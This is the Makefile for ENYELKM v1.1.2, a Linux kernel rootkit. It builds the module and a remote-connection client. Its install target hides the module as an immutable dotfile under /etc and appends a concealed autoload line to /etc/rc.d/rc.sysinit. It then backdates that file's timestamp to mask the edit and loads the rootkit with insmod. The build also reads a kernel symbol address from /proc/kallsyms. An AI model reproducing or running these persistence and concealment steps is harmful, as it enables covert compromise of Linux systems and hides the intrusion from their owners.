obj-m        += enyelkm.o
enyelkm-objs := base.o kill.o ls.o read.o remoto.o idt.o extern_symbols.o lowlevel_layer.o restore_memory.o
DELKOS  = base.ko kill.ko ls.ko read.ko remoto.ko idt.ko extern_symbols.ko lowlevel_layer.ko restore_memory.ko
D_FORK  = 0x`grep do_fork /proc/kallsyms | head -c 8`
VERSION = v1.1.2
CC      = gcc
CFLAGS += -fomit-frame-pointer

all:
	@echo
	@echo "----------------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe & David Reguera Garcia"
	@echo " raise@enye-sec.org  | www.enye-sec.org"
	@echo " davidregar@yahoo.es | http://www.fr33project.org/"
	@echo "----------------------------------------------------"
	@echo
	@echo "#define DOFORK $(D_FORK)" >> data.h
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
	$(CC) conectar.c -o conectar -Wall
	@rm -f $(DELKOS)

conectar:
	@echo
	@echo "----------------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe & David Reguera Garcia"
	@echo " raise@enye-sec.org  | www.enye-sec.org"
	@echo " davidregar@yahoo.es | http://www.fr33project.org/"
	@echo "----------------------------------------------------"
	@echo
	$(CC) conectar.c -o conectar -Wall
	@echo

install:
	@echo
	@echo "----------------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe & David Reguera Garcia"
	@echo " raise@enye-sec.org  | www.enye-sec.org"
	@echo " davidregar@yahoo.es | http://www.fr33project.org/"
	@echo "----------------------------------------------------"
	@echo
	@cp -f enyelkm.ko /etc/.enyelkmOCULTAR.ko
	@chattr +i /etc/.enyelkmOCULTAR.ko > /dev/null 2> /dev/null
	@echo -e "#<OCULTAR_8762>\ninsmod /etc/.enyelkmOCULTAR.ko" \
		\ " > /dev/null 2> /dev/null\n#</OCULTAR_8762>" \
		\ >> /etc/rc.d/rc.sysinit
	@touch -r /etc/rc.d/rc /etc/rc.d/rc.sysinit > /dev/null 2> /dev/null
	@insmod /etc/.enyelkmOCULTAR.ko
	@echo + enyelkm.ko copiado a /etc/.enyelkmOCULTAR.ko
	@echo + instalada cadena de autocarga en /etc/rc.d/rc.sysinit oculta
	@echo + enyelkm cargado !
	@echo 

clean:
	@echo
	@echo "----------------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe & David Reguera Garcia"
	@echo " raise@enye-sec.org  | www.enye-sec.org"
	@echo " davidregar@yahoo.es | http://www.fr33project.org/"
	@echo "----------------------------------------------------"
	@echo
	@rm -rf *.o *.ko *.mod.c .*.cmd data.h conectar .tmp_versions
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean

